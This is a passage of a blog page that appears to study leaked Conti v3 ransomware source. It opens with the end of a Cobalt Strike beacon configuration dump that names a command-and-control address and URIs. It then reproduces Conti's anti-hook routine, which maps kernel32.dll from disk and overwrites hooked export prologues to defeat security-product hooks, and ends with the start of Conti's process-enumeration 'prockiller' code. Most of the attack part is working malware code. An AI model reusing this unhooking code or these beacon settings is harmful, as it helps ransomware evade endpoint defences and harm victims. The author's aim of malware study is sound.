class="line">0x0008 server,get-uri                   0x0003 0x0100 &#x27;104.128.232.37,/updates.rss&#x27;</span><br><span class="line">0x0043                                  0x0001 0x0002 0</span><br><span class="line">0x0044                                  0x0002 0x0004 4294967295</span><br><span class="line">0x0045                                  0x0002 0x0004 4294967295</span><br><span class="line">0x0046                                  0x0002 0x0004 4294967295</span><br><span class="line">0x000e SpawnTo                          0x0003 0x0010 (NULL ...)</span><br><span class="line">0x001d spawnto_x86                      0x0003 0x0040 &#x27;%windir%\\syswow64\\rundll32.exe&#x27;</span><br><span class="line">0x001e spawnto_x64                      0x0003 0x0040 &#x27;%windir%\\sysnative\\rundll32.exe&#x27;</span><br><span class="line">0x001f CryptoScheme                     0x0001 0x0002 0</span><br><span class="line">0x001a get-verb                         0x0003 0x0010 &#x27;GET&#x27;</span><br><span class="line">0x001b post-verb                        0x0003 0x0010 &#x27;POST&#x27;</span><br><span class="line">0x001c HttpPostChunk                    0x0002 0x0004 0</span><br><span class="line">0x0025 license-id                       0x0002 0x0004 1580103824 Stats uniques -&gt; ips/hostnames: 42 publickeys: 10</span><br><span class="line">0x0026 bStageCleanup                    0x0001 0x0002 0</span><br><span class="line">0x0027 bCFGCaution                      0x0001 0x0002 0</span><br><span class="line">0x0009 useragent                        0x0003 0x0100 &#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2)&#x27;</span><br><span class="line">0x000a post-uri                         0x0003 0x0040 &#x27;/submit.php&#x27;</span><br><span class="line">0x000b Malleable_C2_Instructions        0x0003 0x0100 &#x27;\x00\x00\x00\x04&#x27;</span><br><span class="line">0x000c http_get_header                  0x0003 0x0200</span><br><span class="line">  Cookie</span><br><span class="line">0x000d http_post_header                 0x0003 0x0200</span><br><span class="line">  &amp;Content-Type: application/octet-stream</span><br><span class="line">  id</span><br><span class="line">0x0036 HostHeader                       0x0003 0x0080 (NULL ...)</span><br><span class="line">0x0032 UsesCookies                      0x0001 0x0002 1</span><br><span class="line">0x0023 proxy_type                       0x0001 0x0002 2 IE settings</span><br><span class="line">0x003a                                  0x0003 0x0080 &#x27;\x00\x04&#x27;</span><br><span class="line">0x0039                                  0x0003 0x0080 &#x27;\x00\x04&#x27;</span><br><span class="line">0x0037                                  0x0001 0x0002 0</span><br><span class="line">0x0028 killdate                         0x0002 0x0004 0</span><br><span class="line">0x0029 textSec</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-28</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 2470 words, 8 min 13 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/18/anti-hook/">anti-hook</a></h3></div><div class="post-content"><div class="card"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>part of conti v3 Ransomeware, by the way, fucking the school’s midterm exam. I’m longing for the day becoming stronger in Virus Learning. </p>
<h2 id="打开系统对应的文件"><a href="#打开系统对应的文件" class="headerlink" title="打开系统对应的文件"></a>打开系统对应的文件</h2><p>导入kernel32.dll并获取文件路径,打开文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hKernel32 = apLoadLibraryA(_STR(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">apGetModuleFileNameW(hmodule, moduleRealPath, MAX_PATH);</span><br><span class="line"></span><br><span class="line">hFile = pCreateFileW(moduleRealPath, GENERIC_READ, FILE_SHARE_READ, <span class="number">0</span>, OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hFile)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">DWORD Size = <span class="number">0</span>;</span><br><span class="line">    DWORD H;</span><br><span class="line">    LARGE_INTEGER LargeInt;</span><br><span class="line">    pGetFileSizeEx(hFile, &amp;LargeInt);</span><br><span class="line">    Size = LargeInt.QuadPart;</span><br><span class="line">    <span class="keyword">if</span> (!Size)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">hFileMap = apCreateFileMappingW(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hFileMap)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">originDll = (LPBYTE)apMapViewOfFile(hFileMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, Size);</span><br><span class="line">    <span class="keyword">if</span> (!originDll)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFileMap);</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取modules-NT-Header"><a href="#获取modules-NT-Header" class="headerlink" title="获取modules NT Header"></a>获取modules NT Header</h2><blockquote>
<p>在 IMAGE_DOS_HEADER 结构体中的 e_lfanew 成员指定了 NT 头的偏移为 000000f0。这两个范围中间就是 DOS stub 的偏移区域。</p>
<p>计算NT头的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PNTHeader = ImageBase + dosHeader -&gt;e_Ifanew</span><br></pre></td></tr></table></figure>

<p>根据NT_headers 找到OptionalHeader</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line"></span><br><span class="line">DWORD Signature;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line"></span><br><span class="line">DWORD Signature;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>

<p>Optional Headers</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line"> WORD        Magic;</span><br><span class="line"> BYTE        MajorLinkerVersion;</span><br><span class="line"> BYTE        MinorLinkerVersion;</span><br><span class="line"> DWORD       SizeOfCode;</span><br><span class="line"> DWORD       SizeOfInitializedData;</span><br><span class="line"> DWORD       SizeOfUninitializedData;</span><br><span class="line"> DWORD       AddressOfEntryPoint;</span><br><span class="line"> DWORD       BaseOfCode;</span><br><span class="line"> ULONGLONG   ImageBase;</span><br><span class="line"> DWORD       SectionAlignment;</span><br><span class="line"> DWORD       FileAlignment;</span><br><span class="line"> WORD        MajorOperatingSystemVersion;</span><br><span class="line"> WORD        MinorOperatingSystemVersion;</span><br><span class="line"> WORD        MajorImageVersion;</span><br><span class="line"> WORD        MinorImageVersion;</span><br><span class="line"> WORD        MajorSubsystemVersion;</span><br><span class="line"> WORD        MinorSubsystemVersion;</span><br><span class="line"> DWORD       Win32VersionValue;</span><br><span class="line"> DWORD       SizeOfImage;</span><br><span class="line"> DWORD       SizeOfHeaders;</span><br><span class="line"> DWORD       CheckSum;</span><br><span class="line"> WORD        Subsystem;</span><br><span class="line"> WORD        DllCharacteristics;</span><br><span class="line"> ULONGLONG   SizeOfStackReserve;</span><br><span class="line"> ULONGLONG   SizeOfStackCommit;</span><br><span class="line"> ULONGLONG   SizeOfHeapReserve;</span><br><span class="line"> ULONGLONG   SizeOfHeapCommit;</span><br><span class="line"> DWORD       LoaderFlags;</span><br><span class="line"> DWORD       NumberOfRvaAndSizes;</span><br><span class="line"> IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

<p>IMAGE_DATA_DIRECTORY结构如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220418213329225.png" alt="image-20220418213329225"></p>
</blockquote>
<h2 id="检查文件位数，并获取IMAGE-DATA-DIRECTORY数据。"><a href="#检查文件位数，并获取IMAGE-DATA-DIRECTORY数据。" class="headerlink" title="检查文件位数，并获取IMAGE_DATA_DIRECTORY数据。"></a>检查文件位数，并获取<code>IMAGE_DATA_DIRECTORY</code>数据。</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the File Offset of the modules NT Header</span></span><br><span class="line">uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic)</span><br><span class="line">&#123;</span><br><span class="line">    uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32)</span><br><span class="line">        uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic)</span><br><span class="line">    &#123;</span><br><span class="line">        uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64)</span><br><span class="line">            uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFileMap);</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后根据<code>uiBaseAddress</code>和<code>uiExportDir</code>获取如下数据</p>
<ul>
<li>export directory</li>
<li>name pointers</li>
<li>the array of addresses</li>
<li>the array of name ordinals</li>
<li>the number of exported functions</li>
</ul>
<blockquote>
<p>结构体<code>_IMAGE_EXPORT_DIRECTORY</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line"> DWORD   Characteristics;</span><br><span class="line"> DWORD   TimeDateStamp;</span><br><span class="line"> WORD    MajorVersion;</span><br><span class="line"> WORD    MinorVersion;</span><br><span class="line"> DWORD   Name;</span><br><span class="line"> DWORD   Base;</span><br><span class="line"> DWORD   NumberOfFunctions;</span><br><span class="line"> DWORD   NumberOfNames;</span><br><span class="line"> DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class="line"> DWORD   AddressOfNames;         // RVA from base of image</span><br><span class="line"> DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">    uiExportDir = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">    uiNameArray = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames, uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">    uiAddressArray = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions,</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">    uiNameOrdinals = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals,</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;NumberOfNames;</span><br></pre></td></tr></table></figure>

<h2 id="获取导出函数表"><a href="#获取导出函数表" class="headerlink" title="获取导出函数表"></a>获取导出函数表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic)</span><br><span class="line">    &#123;</span><br><span class="line">        uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32)</span><br><span class="line">            uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic)</span><br><span class="line">        &#123;</span><br><span class="line">            uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64)</span><br><span class="line">                uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            pCloseHandle(hFileMap);</span><br><span class="line">            pCloseHandle(hFile);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="检查hook"><a href="#检查hook" class="headerlink" title="检查hook"></a>检查hook</h2><ul>
<li>遍历函数<ul>
<li>检查是否有转发函数（这个概念还不是很清楚），若是则跳过</li>
<li>比较当前函数和系统中函数是否相同<ul>
<li>若函数已经被hook，则利用函数的前5byte进行覆盖，即antihook</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; dwCounter--; uiNameArray += <span class="keyword">sizeof</span>(DWORD), uiNameOrdinals += <span class="keyword">sizeof</span>(WORD))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(uiBaseAddress</span><br><span class="line">            + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">        uiAddressArray = uiBaseAddress</span><br><span class="line">            + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions,</span><br><span class="line">                uiBaseAddress);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">    		<span class="comment">// loop the uiAddressArray with the uiNameOrdinals</span></span><br><span class="line">        uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// compute the File Offset to the function code</span></span><br><span class="line">        UINT_PTR funcAddr = uiBaseAddress + Rva2Offset(DEREF_32(uiAddressArray),</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line"> 				<span class="comment">// pass the for</span></span><br><span class="line">        <span class="type">bool</span> isForwarder = isForwardedFunc((<span class="type">const</span> <span class="type">void</span>*)funcAddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isForwarder) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>* funcHooked = apGetProcAddress(hmodule, cpExportedFunctionName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!funcHooked) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        BYTE* p = (BYTE*)funcHooked;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="number">0xe9</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="number">0xff</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (p[<span class="number">1</span>] != <span class="number">0x25</span>) <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __MINGW32__</span></span><br><span class="line">        <span class="type">bool</span> funcIsHooked = (<span class="built_in">memcmp</span>((<span class="type">const</span> <span class="type">void</span>*)funcAddr, (<span class="type">const</span> <span class="type">void</span>*)funcHooked, <span class="number">2</span>) != <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">bool</span> funcIsHooked = m_memcmp((<span class="type">const</span> <span class="type">void</span>*)funcAddr, (<span class="type">const</span> <span class="type">void</span>*)funcHooked, <span class="number">2</span>) != <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __MINGW32</span></span></span><br><span class="line">        <span class="keyword">if</span> (!funcIsHooked) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">        DWORD oldProtect1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);</span></span><br><span class="line"><span class="comment">        VirtualProtectFunc pVirtualProtect = (VirtualProtectFunc)GetProcAddress(hKernel32,</span></span><br><span class="line"><span class="comment">            _STR(&quot;VirtualProtect&quot;));</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!apVirtualProtect(funcHooked, <span class="number">64</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//memcpy((void*)funcHooked, (void*)funcAddr, 10);</span></span><br><span class="line">        CopyMemory((<span class="type">void</span>*)funcHooked, (<span class="type">void</span>*)funcAddr, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!apVirtualProtect(funcHooked, <span class="number">64</span>, oldProtect, &amp;oldProtect1))</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware/" title="Ransomeware">Ransomeware </a><span class="leancloud_visitors"></span><span>About 919 words, 3 min 3 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/18/conti%20v3%20source%20code%20learning/">Conti v3 Ransomeware Souce Code Analysis</a></h3></div><div class="post-content"><div class="card"><p><h2 id="prockiller"><a href="#prockiller" class="headerlink" title="prockiller"></a>prockiller</h2><h3 id="memorySnapshot"><a href="#memorySnapshot" class="headerlink" title="memorySnapshot"></a>memorySnapshot</h3><ul>
<li>pCreateToolhelp32Snapshot</li>
<li>pProcess32FirstW</li>
<li>pProcess32NextW</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;prockiller.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../obfuscation/MetaString.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">process_killer::GetWhiteListProcess</span><span class="params">(__out PPID_LIST PidList)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32W pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pProcess32FirstW(hSnapShot, &amp;pe32)) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!plstrcmpiW(pe32.szExeFile, OBFW(<span class="string">L&quot;explorer.exe&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">			PPID Pid = (PPID)m_malloc(<span class="keyword">sizeof</span>(PID));</span><br><span class="line">			<span class="keyword">if</span> (!Pid) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Pid-&gt;dwProcessId = pe32.th32ProcessID;</span><br><span class="line">			TAILQ_INSERT_TAIL(PidList, Pid, Entries);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (pProcess32NextW(hSnapShot, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	pCloseHandle(hSnapShot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
